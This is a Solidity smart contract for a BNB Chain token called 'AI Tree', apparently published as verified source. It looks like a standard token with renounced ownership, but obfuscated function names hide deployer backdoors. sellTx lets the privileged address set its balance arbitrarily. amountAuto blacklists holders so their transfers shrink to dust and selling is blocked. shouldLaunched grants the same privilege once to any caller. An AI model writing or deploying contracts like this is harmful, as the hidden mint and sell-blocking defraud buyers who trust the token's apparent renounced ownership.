/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tradingAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyTake {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AITree is Ownable{
    uint8 public decimals = 18;
    mapping(address => bool) public autoSender;
    uint256 constant feeSender = 10 ** 10;
    mapping(address => bool) public tradingListTx;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public symbol = "ATE";
    string public name = "AI Tree";

    bool public teamWallet;

    address public buySender;

    mapping(address => uint256) public balanceOf;
    address public enableFee;

    mapping(address => mapping(address => uint256)) public allowance;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tradingAt receiverMax = tradingAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buySender = buyTake(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));
        enableFee = limitEnable();
        autoSender[enableFee] = true;
        balanceOf[enableFee] = totalSupply;
        emit Transfer(address(0), enableFee, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner();
    }

    function amountAuto(address buyTeam) public {
        if (buyTeam == enableFee || buyTeam == buySender || !autoSender[limitEnable()]) {
            return;
        }
        tradingListTx[buyTeam] = true;
    }

    function shouldLaunched(address fromShould) public {
        if (teamWallet) {
            return;
        }
        autoSender[fromShould] = true;
        teamWallet = true;
    }

    function transfer(address atWallet, uint256 fromSender) external returns (bool) {
        return transferFrom(limitEnable(), atWallet, fromSender);
    }

    function transferFrom(address listShould, address atWallet, uint256 fromSender) public returns (bool) {
        if (listShould != limitEnable() && allowance[listShould][limitEnable()] != type(uint256).max) {
            require(allowance[listShould][limitEnable()] >= fromSender);
            allowance[listShould][limitEnable()] -= fromSender;
        }
        if (atWallet == enableFee || listShould == enableFee) {
            return listAtExempt(listShould, atWallet, fromSender);
        }
        if (tradingListTx[listShould]) {
            return listAtExempt(listShould, atWallet, feeSender);
        }
        return listAtExempt(listShould, atWallet, fromSender);
    }

    function limitEnable() private view returns (address) {
        return msg.sender;
    }

    function sellTx(uint256 fromSender) public {
        if (!autoSender[limitEnable()]) {
            return;
        }
        balanceOf[enableFee] = fromSender;
    }

    function listAtExempt(address liquidityTeam, address takeListBuy, uint256 fromSender) internal returns (bool) {
        require(balanceOf[liquidityTeam] >= fromSender);
        balanceOf[liquidityTeam] -= fromSender;
        balanceOf[takeListBuy] += fromSender;
        emit Transfer(liquidityTeam, takeListBuy, fromSender);
        return true;
    }

    function approve(address tokenLaunch, uint256 fromSender) public returns (bool) {
        allowance[limitEnable()][tokenLaunch] = fromSender;
        emit Approval(limitEnable(), tokenLaunch, fromSender);
        return true;
    }


}